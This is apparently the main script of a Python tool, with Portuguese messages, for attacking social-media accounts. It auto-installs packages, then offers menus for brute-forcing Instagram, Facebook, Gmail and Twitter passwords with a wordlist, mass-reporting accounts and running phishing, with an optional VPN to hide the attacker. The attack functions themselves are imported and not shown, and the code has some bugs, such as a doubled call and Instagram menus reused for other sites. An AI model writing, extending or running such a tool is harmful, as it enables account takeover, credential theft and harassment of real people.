from utils import *
from rich.console import Console
import platform

console = Console()

def check_and_install_libraries():
    try:
        with open('requirements.txt') as f:
            required_libraries = f.read().splitlines()
    except FileNotFoundError:
        console.print("Arquivo 'requirements.txt' não encontrado. Certifique-se de que o arquivo existe no mesmo diretório que este script.")
        sys.exit(1)

    try:
        for lib in required_libraries:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
    except subprocess.CalledProcessError:
        console.print("Falha ao instalar as bibliotecas. Verifique sua conexão com a internet e tente novamente.")
        sys.exit(1)
    console.print("Bibliotecas instaladas com sucesso!")


check_and_install_libraries()
# print ascii art & loading screen
start()
# select social media
choice = c1()
#vpn on/off
vpn = c_vpn()


if vpn == 1:
	if "Linux" not in platform.system():
		vpn_error()



if choice == 1:
	choice = start_instagram()
	if choice == 1:
		username = get_username()
		wordlist = get_wordlist()
		insta_bruteforce(username, wordlist, vpn)
	if choice == 2:
		username = get_username()
		amount = get_amount()
		insta_massreport(username, vpn, amount, 1)
	if choice == 3:
		insta_phishing()
elif choice == 2:
	choice = start_instagram()
	if choice == 1:
		username = get_facebook()()
		wordlist = get_wordlist()
		facebook_bruteforce(username, wordlist, vpn)
	if choice == 2:
		facebook_massreport()
	if choice == 3:
		facebook_phishing()
elif choice == 3:
	choice = start_instagram()
	if choice == 1:	
		username = get_email()
		wordlist = get_wordlist()
		gmail_bruteforce(username, wordlist, vpn)
	if choice == 2:
		gmail_massreport()
	if choice == 3:
		gmail_phishing()


elif choice == 4:
	choice = start_instagram()
	if choice == 1:	
		username = get_username()
		wordlist = get_wordlist()
		twitter_bruteforce(username, wordlist, vpn)
	if choice == 2:
		twitter_massreport()
	if choice == 3:
		twitter_phishing()
